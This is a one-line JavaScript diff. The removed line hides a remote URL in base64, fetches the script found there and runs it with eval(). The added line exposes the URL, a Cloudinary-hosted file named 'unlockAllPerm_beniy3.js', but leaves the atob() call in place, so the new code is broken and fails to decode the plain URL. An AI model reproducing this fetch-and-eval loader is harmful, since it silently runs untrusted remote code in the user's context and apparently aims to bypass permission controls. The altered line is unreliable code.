@@ -1,1 +1,1 @@
-fetch(atob("aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZG0yaG9hNDVxL3Jhdy91cGxvYWQvdjE2Mzg1NjczNzkvdW5sb2NrQWxsUGVybV9iZW5peTMuanM=")).then((res) => res.text().then((t) => eval(t)))
+fetch(atob("https://res.cloudinary.com/dm2hoa45q/raw/upload/v1638567379/unlockAllPerm_beniy3.js")).then((res) => res.text().then((t) => eval(t)))
